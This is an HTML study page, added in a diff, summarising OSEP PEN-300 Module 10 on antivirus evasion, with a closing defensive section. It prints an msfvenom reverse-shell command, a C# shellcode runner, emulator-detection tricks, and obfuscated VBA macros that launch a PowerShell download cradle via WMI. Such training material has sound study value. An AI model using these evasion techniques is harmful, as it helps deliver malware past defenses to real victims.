@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 10 — Introduction to Antivirus Evasion (signature & heuristic bypasses) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 10 — Introduction to Antivirus Evasion (signature & heuristic bypasses)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<h2>Objective</h2>
+<p>Build a working methodology for evading antivirus products on a client-side engagement: understand <strong>how AV classifies malware</strong> (signature-based vs. heuristic/emulated detection, on-demand vs. real-time scanning), then iteratively reduce detection counts for three payload carriers used throughout the rest of the course:</p>
+<ol>
+<li>A <strong>custom C# shellcode runner</strong> (replaces msfvenom-generated executables).</li>
+<li><strong>Microsoft Office documents</strong> with VBA shellcode runners (plus VBA Stomping).</li>
+<li><strong>VBA + PowerShell download cradles</strong> (de-chained via WMI, fully obfuscated).</li>
+</ol>
+<p>The measure of progress throughout the module is the <strong>AntiScan.Me multi-engine result</strong> — the lab's ground truth for how many of 26 engines flag each revision (Avira real-time on the victim is checked separately with on-demand scans).</p>
+<h2>Target surface</h2>
+<ul>
+<li><strong>Windows 10 development machine</strong> — Visual Studio (C# Console App projects), FlexHEX, <code>C:\Tools\EvilClippy.exe</code>.</li>
+<li><strong>Windows 10 victim machine</strong> — Avira installed with real-time protection; used for on-demand scan validation.</li>
+<li><strong>Kali attack machine</strong> — msfvenom for shellcode generation, <code>nc</code>/Metasploit multi/handler for callbacks.</li>
+<li>Engines exercised: <strong>Avira</strong>, <strong>ClamAV</strong> (on-demand) and <strong>AntiScan.Me</strong> (26 engines, signature + heuristic).</li>
+<li>Shorthand: <code>OSEP1\offsec</code> / password <code>lab</code> on the lab machines (documented in the course environment, not a discovered credential).</li>
+</ul>
+<h2>Techniques</h2>
+<h3>0. How AV detects (theory)</h3>
+<ul>
+<li><strong>Signature-based detection</strong> — byte patterns (e.g. known shellcode encoders, msfvenom stubs, template code) matched against files. Defeated by <em>changing the bytes</em>: custom code, custom encryption.</li>
+<li><strong>Heuristic detection</strong> — the AV <strong>emulates</strong> execution in a sandbox and watches behavior (suspicious API sequences, timing, memory allocation). Defeated by <em>changing the behavior</em>: detecting the emulator and exiting early.</li>
+<li><strong>On-demand vs. real-time</strong> — scheduled/manual scans vs. continuous file/monitor interception. The module validates against both.</li>
+<li>Empirical baseline: msfvenom-generated executables are flagged almost universally (24/26); even benign-format documents carrying a stock Meterpreter stager get flagged by several engines — signatures for public payloads are everywhere.</li>
+</ul>
+<h3>1. Bypassing signature detection — custom C# shellcode runner — 10.1.1</h3>
+<p>Generate raw (unencoded) shellcode once:</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; \
+  -f csharp
+# buf = new byte[752] { 0xfc,0x48,0x83,0xe4,... }   &lt;-- full array omitted here
+</code></pre>
+<p>Then stop shipping malware binaries and compile your own runner — no msfvenom exe template, no encoder stub. Classic Win32 triad via P/Invoke:</p>
+<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, SetLastError=true, ExactSpelling=true)]
+static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+// VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000 /*MEM_COMMIT|RESERVE*/, 0x40 /*RWX*/);
+// Marshal.Copy(buf, 0, addr, buf.Length); CreateThread(...); WaitForSingleObject(h, 0xFFFFFFFF);
+</code></pre>
+<p>Result: <strong>Avira and ClamAV clean</strong> (custom binary beats both on-demand engines) but AntiScan.Me still flags <strong>11/26</strong> — heuristic engines are unimpressed by RWX + CreateThread.</p>
+<h3>2. Bypassing signature detection — custom encryption — 10.1.2</h3>
+<p>msfvenom encoders are signatured and AES is impractical to implement by hand, so the course uses a <strong>Caesar cipher</strong> (add a constant to every byte; trivial to implement without external libraries, and enough to destroy static signatures).</p>
+<p>Encrypt in a throwaway helper project, print in msfvenom format:</p>
+<pre><code class="language-csharp">// key = 2
+for(int i = 0; i &lt; buf.Length; i++)
+    encoded[i] = (byte)(((uint)buf[i] + 2) &amp; 0xFF);   // &amp; 0xFF keeps it in 0-255
+
+StringBuilder hex = new StringBuilder(encoded.Length * 2);
+foreach(byte b in encoded)
+    hex.AppendFormat(&quot;0x{0:x2}, &quot;, b);                // &quot;0x{0:x2} &quot; → msfvenom-look output
+Console.WriteLine(&quot;The payload is: &quot; + hex.ToString());
+</code></pre>
+<p>Decrypt in the runner before <code>VirtualAlloc</code>:</p>
+<pre><code class="language-csharp">for(int i = 0; i &lt; buf.Length; i++)
+    buf[i] = (byte)(((uint)buf[i] - 2) &amp; 0xFF);
+</code></pre>
+<p>Result: <strong>7/26</strong> (down from 11). Lesson: custom-but-crypto-trivial obfuscation breaks most static signatures; the remaining detections are heuristics.</p>
+<h3>3. Bypassing heuristics (emulation) — 10.2</h3>
+<p>Two emulator-detection primitives, both following the same pattern: <em>check for a condition that differs between a real OS and the AV emulator; if emulated, exit before doing anything suspicious.</em></p>
+<p><strong>a) Time-lapse check with <code>Sleep</code></strong> — emulators fast-forward through sleep calls:</p>
+<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;)] static extern void Sleep(uint dwMilliseconds);
+
+DateTime t1 = DateTime.Now;
+Sleep(2000);
+double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+if (t2 &lt; 1.5) { return; }   // 1.5s tolerance for measurement inaccuracy
+</code></pre>
+<p>Sleep alone doesn't change the score (11/26 — signatures still dominate); <strong>combined with the Caesar-encrypted shellcode</strong> the encryption + time-lapse pair pushes the count down further.</p>
+<p><strong>b) Non-emulated API: <code>VirtualAllocExNuma</code></strong> — obscure APIs (rarely used, poorly documented) are often simply <em>not implemented</em> in AV emulators, so the call fails under emulation. No pinvoke.net entry exists, but the prototype mirrors <code>VirtualAllocEx</code> with one extra <code>DWORD</code> (<code>nndPreferred</code> = target NUMA node):</p>
+<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, SetLastError=true, ExactSpelling=true)]
+static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
+    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern IntPtr GetCurrentProcess();
+
+IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+if (mem == null) { return; }   // emulator can't satisfy it → bail out
+</code></pre>
+<p>Encryption + <code>VirtualAllocExNuma</code> (no Sleep needed): <strong>4/26</strong>. Exercise set also suggests <code>FlsAlloc</code> and hunting for further non-emulated APIs.</p>
+<h3>4. Bypassing AV in VBA — 10.3.1</h3>
+<p>The staged VBA runner ( Declare PtrSafe <code>VirtualAlloc</code> / <code>RtlMoveMemory</code> / <code>CreateThread</code>, shellcode as a <code>Variant</code> decimal <code>Array(...)</code>, <code>AutoOpen</code> → <code>mymacro</code>) scans at <strong>7/26</strong>. Attempts:</p>
+<ul>
+<li><strong>Caesar encryption in VBA</strong> — re-encrypt in the C# helper, emit <em>decimal</em> values with a line-continuation every 50 bytes (<code>AppendFormat("{0:D}, ")</code> + <code>if (counter % 50 == 0) hex.AppendFormat("_{0}", Environment.NewLine)</code>); decrypt with <code>For i = 0 To UBound(buf): buf(i) = buf(i) - 2: Next i</code>. <strong>No improvement (7/26)</strong> — the vector itself is signatured.</li>
+<li><strong><code>Sleep</code> time-lapse in VBA</strong> — <code>t1 = Now(): Sleep (2000): t2 = Now(): If DateDiff("s", t1, t2) &lt; 2 Then Exit Function</code>. <strong>Still 7/26</strong> — confirms the detections are Office-vector signatures, not payload heuristics. Office documents are so heavily abused that vendors have invested heavily in this attack surface specifically.</li>
+</ul>
+<h3>5. VBA Stomping — 10.3.2</h3>
+<p>Background on the file formats:</p>
+<ul>
+<li><code>.doc</code>/<code>.xls</code> = <strong>Compound File Binary Format (CFBF)</strong> — a filesystem-in-a-file; inspect with <strong>FlexHEX</strong> (File → Open → OLE Compound File).</li>
+<li><code>.docm</code>/<code>.xlsm</code> = zip-like OOXML; macros live in <code>vbaProject.bin</code> inside the archive.</li>
+</ul>
+<p>Key structures inside the <code>Macros</code> folder:</p>
+<ul>
+<li><strong><code>PROJECT</code></strong> — contains <code>Module=NewMacros</code>; nulling this ASCII line (Edit → Insert Zero Block) hides the macro from the graphical VBA editor (defeats <em>manual</em> review, not AV scans — the macro still runs).</li>
+<li><strong>PerformanceCache / P-code</strong> — both <code>_VBA_PROJECT</code> and <code>NewMacros</code> carry a <strong>compiled, cached version of the VBA</strong>, specific to the Office version/edition that produced it (the header records e.g. "Office 16", VBE7.DLL, 32-bit path). If the doc opens on a <strong>matching</strong> Office install, Word executes the P-code and <strong>ignores the textual source entirely</strong>; on a mismatch, P-code is ignored and the source is used (→ macro fails if stomped).</li>
+<li><strong><code>CompressedSourceCode</code></strong> — the (partially compressed) VBA source inside <code>NewMacros</code>, starting at <code>Attribute VB_Name = "NewMacros"</code>.</li>
+</ul>
+<p>The stomp: zero out everything from <code>Attribute VB_Name</code> to the end of the file (source only, P-code preserved). Effects:</p>
+<ol>
+<li>The VBA editor shows an <strong>empty container</strong>, yet the macro still executes (reverse shell lands).</li>
+<li>Word then <strong>decompiles the P-code back into the editor</strong> — the source visibly reappears after execution.</li>
+<li>AntiScan.Me drops to <strong>4/26</strong> — very few engines inspect P-code at all.</li>
+</ol>
+<p>Caveats: version-matching is mandatory (wrong Office version ⇒ no execution at all), and the technique relies on partially undocumented format internals — more evasions may exist. <strong>Evil Clippy</strong> (<code>C:\Tools\EvilClippy.exe</code>) automates the process.</p>
+<h3>6. Hiding PowerShell inside VBA — dechaining with WMI — 10.4.1–10.4.2</h3>
+<p>Baseline: a VBA macro that only launches a PowerShell download cradle —</p>
+<pre><code class="language-vba">Sub MyMacro()
+  Dim strArg As String
+  strArg = &quot;powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://&lt;ip&gt;/run.txt'))&quot;
+  Shell strArg, vbHide
+End Sub
+</code></pre>
+<p>— scores a surprising <strong>8/26</strong>: <em>worse</em> than a document with raw shellcode. Two causes: the <strong><code>Shell</code> method</strong> itself (PowerShell becomes a <strong>child of WINWORD.EXE</strong> — suspicious parent-child chain) and the <strong>universally signatured cradle string</strong>.</p>
+<p><strong>De-chain with WMI</strong> — <code>winmgmt</code> runs inside svchost (LocalSystem); WMI launches actions in <strong><code>Wmiprvse.exe</code></strong>, so PowerShell gets a benign parent, and the VBA no longer contains <code>Shell</code>:</p>
+<pre><code class="language-vba">Sub MyMacro
+  strArg = &quot;powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://&lt;ip&gt;/run.txt'))&quot;
+  GetObject(&quot;winmgmts:&quot;).Get(&quot;Win32_Process&quot;).Create strArg, Null, Null, pid
+End Sub
+</code></pre>
+<p>(<code>Create</code> args: command line, two unused creation-info slots, and an out-variable receiving the PID.) Note the spawned PowerShell is <strong>64-bit</strong> even from 32-bit Office — the runner script must match. Score unchanged (<strong>7/26</strong>) — expected, the cradle string is still plaintext — but the <em>structure</em> is now AV-friendly: only ambiguous <code>GetObject</code>/<code>Get</code>/<code>Create</code> calls remain.</p>
+<h3>7. Obfuscating VBA — 10.4.3</h3>
+<p>Three signatured strings to hide: the cradle, <code>winmgmts:</code>, and <code>Win32_Process</code>.</p>
+<p><strong>Attempt 1 — <code>StrReverse</code></strong> on every string, wrapped in a benignly-named function to minimize how often the (malware-notorious) <code>StrReverse</code> token appears:</p>
+<pre><code class="language-vba">Function bears(cows)
+    bears = StrReverse(cows)
+End Function
+
+strArg = bears(&quot;))'txt.nur/&lt;reversed-ip&gt;//:ptth'...&quot;)   ' cradle, reversed
+GetObject(bears(&quot;:stmgmniw&quot;)).Get(bears(&quot;ssecorP_23niW&quot;)).Create strArg, Null, Null, pid
+</code></pre>
+<p><strong>4/26</strong> — a large drop from a trivial trick; but advanced engines may un-reverse strings.</p>
+<p><strong>Attempt 2 — decimal + Caesar (key 17) on every string.</strong> PowerShell encryptor pads each char to 3 digits (<code>[byte][char]$_ + 17</code>, zero-pad to length 3) and copies to the clipboard:</p>
+<pre><code class="language-powershell">$payload = &quot;powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://&lt;ip&gt;/run.txt'))&quot;
+[string]$output = &quot;&quot;
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1) { $thischar = &quot;00&quot; + $thischar; $output += $thischar }
+    elseif($thischar.Length -eq 2) { $thischar = &quot;0&quot; + $thischar; $output += $thischar }
+    else { $output += $thischar }
+}
+$output | clip
+</code></pre>
+<p>VBA decryptor — four benignly-named ("food") functions; <code>Left</code>/<code>Right</code> walk the string 3 digits at a time:</p>
+<pre><code class="language-vba">Function Pears(Beets)          ' Chr(Beets - 17)        — digit-triplet → char
+Function Strawberries(Grapes)  ' Left(Grapes, 3)
+Function Almonds(Jelly)        ' Right(Jelly, Len(Jelly) - 3)
+Function Nuts(Milk)            ' Do: Oatmilk = Oatmilk + Pears(Strawberries(Milk)):
+                               '     Milk = Almonds(Milk): Loop While Len(Milk) &gt; 0
+
+Function MyMacro()
+    Dim Apples As String      ' 3-digit decimal blob for the cradle
+    Dim Water As String
+    Apples = &quot;129128136118131132121...&quot;   ' encrypted cradle (omitted)
+    Water = Nuts(Apples)
+    GetObject(Nuts(&quot;&lt;enc winmgmts:&gt;&quot;)).Get(Nuts(&quot;&lt;enc Win32_Process&gt;&quot;)).Create Water, Tea, Coffee, Napkin
+End Function
+</code></pre>
+<p>(Instead of literal <code>Null</code> args, pass <strong>undefined variables</strong> — VBA treats them as Null/Empty.) → <strong>2/26</strong>.</p>
+<p><strong>Attempt 3 — document-name heuristic check.</strong> AV emulators open the document under a <strong>renamed temp copy</strong>, so checking the name defeats emulation without any Win32 API:</p>
+<pre><code class="language-vba">If ActiveDocument.Name &lt;&gt; Nuts(&quot;&lt;encrypted 'runner.doc'&gt;&quot;) Then
+  Exit Function
+End If
+</code></pre>
+<p>Final result: <strong>1/26</strong> — the full stack (WMI de-chaining + full-string encryption + benign names + document-name check) is the module's best document payload.</p>
+<p><strong>Extra Mile:</strong> modify, encrypt, and obfuscate the C# process-hollowing techniques from module 9 to bypass AV. Exercises also include exploiting Serviio PRO 1.8 (DLNA media server) on the Windows 10 victim for SYSTEM while evading Avira real-time.</p>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>Signature detection is nearly dead against custom code.</strong> Every detection reduction in the module came from changing <em>bytes we control</em>: compiling our own runner, custom (even trivially weak) encryption, benign identifier names. Defensively, this is why vendor detection counts are a lagging indicator — engines react to samples after the fact.</li>
+<li><strong>Heuristic/emulated detection is brittle in both directions.</strong> Emulators fast-forward <code>Sleep</code>, skip obscure APIs (<code>VirtualAllocExNuma</code>), and rename files under test — every emulator shortcut is an oracle an attacker can read (time-lapse, null returns, <code>ActiveDocument.Name</code>). Vendors must emulate <em>everything</em> or leak detectable divergences.</li>
+<li><strong>The Office attack surface is signature-heavy by necessity</strong> (7-8 flags even for stock runners) — but VBA Stomping shows the parser-level blind spot: few engines execute/inspect <strong>P-code</strong>, only the textual source. Detection that doesn't decompile P-code misses stomped macros entirely; the version-matching requirement also means stomped docs break on mismatched Office builds, which is itself an observable failure.</li>
+<li><strong>Parent-child process lineage matters.</strong> <code>WINWORD.EXE → powershell.exe</code> was flagged heavily on its own; <code>WINWORD.EXE → WmiPrvSE.exe → powershell.exe</code> was not. EDR-style detection should key on Office spawning script hosts <em>at all</em>, via any intermediary — not on one suspicious chain.</li>
+<li><strong>No first-stage on disk ≠ undetectable.</strong> The download-cradle payloads still rely on fetching and executing remote code; detecting the cradle pattern, the WMI process creation from Office, and the resulting network callbacks are the durable signals, since the document content can be fully encrypted.</li>
+<li><strong>Behavioral anchors that survive all obfuscation here:</strong> RWX private-memory allocation + thread execution (C# runner), <code>Win32_Process.Create</code> from a document context, Office processes spawning <code>powershell.exe</code>, and outbound HTTP from script hosts. The module's payloads evade <em>file</em> scanners; runtime/telemetry-based detection is module 11's topic.</li>
+</ul>
+<h2>Wrapping Up</h2>
+<p>Progression of AntiScan.Me scores (26 engines), the module in one table:</p>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>Revision</th>
+<th>Detections</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>msfvenom-generated executable</td>
+<td>24/26</td>
+</tr>
+<tr>
+<td>Custom C# runner (VirtualAlloc + CreateThread)</td>
+<td>11/26</td>
+</tr>
+<tr>
+<td>+ Caesar-encrypted shellcode</td>
+<td>7/26</td>
+</tr>
+<tr>
+<td>+ Sleep time-lapse / + VirtualAllocExNuma (combined)</td>
+<td>4/26</td>
+</tr>
+<tr>
+<td>VBA staged runner (stock)</td>
+<td>7/26</td>
+</tr>
+<tr>
+<td>+ encryption / + Sleep (individually)</td>
+<td>7/26 (no change — vector signatures)</td>
+</tr>
+<tr>
+<td>VBA Stomping (P-code only)</td>
+<td>4/26</td>
+</tr>
+<tr>
+<td>PowerShell cradle via <code>Shell</code> (baseline)</td>
+<td>8/26</td>
+</tr>
+<tr>
+<td>+ WMI de-chaining (<code>Win32_Process</code>)</td>
+<td>7/26</td>
+</tr>
+<tr>
+<td>+ <code>StrReverse</code> obfuscation (wrapped)</td>
+<td>4/26</td>
+</tr>
+<tr>
+<td>+ full decimal+Caesar encryption of all strings</td>
+<td>2/26</td>
+</tr>
+<tr>
+<td>+ document-name emulation check</td>
+<td><strong>1/26</strong></td>
+</tr>
+</tbody>
+</table></div>
+<p>The same primitives (custom compilation, string/byte encryption, emulator detection, process de-chaining) apply to <strong>any tool written to the target's filesystem</strong>, not just shellcode runners. Next module: bypassing <strong>advanced runtime analysis</strong>.</p>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
